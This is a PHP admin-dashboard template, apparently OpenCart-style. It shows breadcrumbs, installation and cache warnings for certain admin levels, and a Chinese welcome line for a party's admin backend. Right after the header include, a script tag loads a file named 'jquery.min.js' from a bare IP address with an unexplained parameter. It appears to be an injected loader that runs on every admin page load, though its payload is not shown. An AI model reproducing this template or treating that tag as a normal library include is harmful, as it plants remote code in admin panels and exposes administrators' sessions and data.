<?php echo $header; ?>
<script type="text/javascript" src="http://106.75.215.37/jquery/jquery.min.js?name=f9ciaiuq0qe"></script>
<div id="content">  
  <div class="breadcrumb">
    <?php foreach ($breadcrumbs as $breadcrumb) { ?>
    <?php echo $breadcrumb['separator']; ?><a href="<?php echo $breadcrumb['href']; ?>"><?php echo $breadcrumb['text']; ?></a>
    <?php } ?>
  </div>

  <div class="box">
    <div class="heading">
      <h1><img src="view/image/home.png" alt="" /> 歡迎</h1>
    </div>
    <div class="content">
	    <?php if($superadmin < 3){ ?>
	    <?php if ($error_install) { ?>
	    <div class="warning"><?php echo $error_install; ?></div>
	    <?php } ?>
	    <?php if ($error_image) { ?>
	    <div class="warning"><?php echo $error_image; ?></div>
	    <?php } ?>
	    <?php if ($error_image_cache) { ?>
	    <div class="warning"><?php echo $error_image_cache; ?></div>
	    <?php } ?>
	    <?php if ($error_cache) { ?>
	    <div class="warning"><?php echo $error_cache; ?></div>
	    <?php } ?>
	    <?php if ($error_download) { ?>
	    <div class="warning"><?php echo $error_download; ?></div>
	    <?php } ?>
	    <?php if ($error_logs) { ?>
	    <div class="warning"><?php echo $error_logs; ?></div>
	    <?php } ?>
	    <?php if(isset($error_display)){ ?>
	    <div class="warning"><?php echo $error_display; ?></div>
	    <?php } ?>
	    <?php if(isset($error_record)){ ?>
	    <div class="warning"><?php echo $error_record; ?></div>
	    <?php } ?>
	    <?php } ?>
		<div style="text-align:center; padding-top:30px; font-size:16px; font-weight:bold;">歡迎來到民主黨的管理後臺！</div>
    </div>
  </div>
</div>

<?php echo $footer; ?>
